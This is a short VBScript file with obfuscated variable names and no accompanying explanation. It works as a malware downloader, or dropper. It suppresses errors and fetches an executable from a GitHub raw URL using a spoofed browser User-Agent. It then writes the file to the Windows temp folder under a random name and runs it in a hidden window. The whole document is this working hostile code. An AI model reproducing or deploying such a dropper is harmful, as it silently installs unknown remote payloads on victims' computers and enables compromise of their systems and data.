On Error Resume Next
Dim cmzxdxry, ztmxbien, eslahhwk, wjaiqcgj
Set cmzxdxry = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set ztmxbien = CreateObject("ADODB.Stream")
Set eslahhwk = CreateObject("WScript.Shell")

cmzxdxry.Open "GET", "https://github.com/hubgit505/extract/raw/refs/heads/main/main.exe", False
cmzxdxry.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
cmzxdxry.Send

If cmzxdxry.Status = 200 Then
    ztmxbien.Open
    ztmxbien.Type = 1
    ztmxbien.Write cmzxdxry.ResponseBody
    
    wjaiqcgj = eslahhwk.ExpandEnvironmentStrings("%TEMP%") & "\wujjhuck.exe"
    ztmxbien.SaveToFile wjaiqcgj, 2
    ztmxbien.Close
    
    eslahhwk.Run wjaiqcgj, 0, False
End If
